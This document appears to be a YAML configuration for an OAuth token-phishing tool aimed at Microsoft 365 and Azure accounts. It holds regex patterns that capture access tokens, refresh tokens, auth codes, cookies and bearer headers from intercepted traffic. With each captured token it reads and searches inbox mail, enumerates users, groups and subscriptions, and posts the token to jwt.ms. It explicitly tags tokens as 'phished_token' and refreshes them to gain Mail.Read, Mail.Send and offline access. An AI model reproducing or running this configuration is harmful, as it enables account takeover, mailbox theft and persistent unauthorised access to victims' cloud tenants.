oauth_assessment:
  enabled: true

  capture_tokens:
    - type: "access_token"
      patterns:
        - '"access_token":"([^"]+)"'
        - 'access_token=([^&]+)'
        - '#access_token=([^&]+)'
        - 'access_token%3D([^&]+)'
        - 'access_token: ([a-zA-Z0-9_\-\.]+)'
    - type: "refresh_token"
      patterns:
        - '"refresh_token":"([^"]+)"'
        - 'refresh_token=([^&]+)'
        - '#refresh_token=([^&]+)'
        - 'refresh_token%3D([^&]+)'
    - type: "id_token"
      patterns:
        - '"id_token":"([^"]+)"'
        - 'id_token=([^&]+)'
        - '#id_token=([^&]+)'
        - 'id_token%3D([^&]+)'
    - type: "code"
      patterns:
        - 'code=([^&]+)'
        - '"code":"([^"]+)"'
        - 'code%3D([^&]+)'
    - type: "cookies"
      patterns:
        - 'Cookie: ([^\\n]+)'
        - '"cookies":"([^"]+)"'
    - type: "bearer_token"
      patterns:
        - 'Authorization: Bearer ([a-zA-Z0-9_\-\.]+)'

  assess_endpoints:
    - name: "Microsoft Graph User Info"
      url: "https://graph.microsoft.com/v1.0/me"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401]
    - name: "Microsoft Graph – Read Inbox (get emails)"
      url: "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top=15&$select=subject,from,receivedDateTime,bodyPreview"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Microsoft Graph – Search unread emails"
      url: "https://graph.microsoft.com/v1.0/me/messages?$search=\"isread:false\"&$top=10"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Microsoft Graph – Get mail folders"
      url: "https://graph.microsoft.com/v1.0/me/mailFolders"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Microsoft Graph – List Users"
      url: "https://graph.microsoft.com/v1.0/users?$top=20"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Microsoft Graph – List Groups"
      url: "https://graph.microsoft.com/v1.0/groups"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Azure Resource Manager – List Subscriptions"
      url: "https://management.azure.com/subscriptions?api-version=2020-01-01"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]
    - name: "Token Introspection (jwt.ms)"
      url: "https://jwt.ms/"
      method: "POST"
      body:
        - "token={access_token}"
    - name: "Microsoft Graph – Get delegated permissions"
      url: "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
      method: "GET"
      headers:
        - "Authorization: Bearer {access_token}"
      expected_status: [200, 401, 403]

  post_assessment_actions:
    - name: "Log token capabilities"
      action: "log_capabilities"
    - name: "Tag as phished token"
      action: "tag_source"
      tag: "phished_token"
    - name: "Attempt token refresh with Mail.Read scope"
      action: "refresh_token"
      endpoint: "https://login.microsoftonline.com/common/oauth2/v2.0/token"
      params:
        - "grant_type=refresh_token"
        - "refresh_token={refresh_token}"
        - "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46"
        - "scope=https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access"

  alert_on:
    - "scope.contains('Mail.Read') OR scope.contains('Mail.ReadWrite')"
    - "response.status == 200 AND endpoint.contains('/mailFolders/inbox/messages')"
    - "response.status == 200 AND endpoint.contains('/users')"
    - "response.body contains 'Global Administrator'"
    - "token_decode.payload.roles contains 'Global Administrator'"
    - "token_decode.payload.roles contains 'Privileged Role Administrator'"

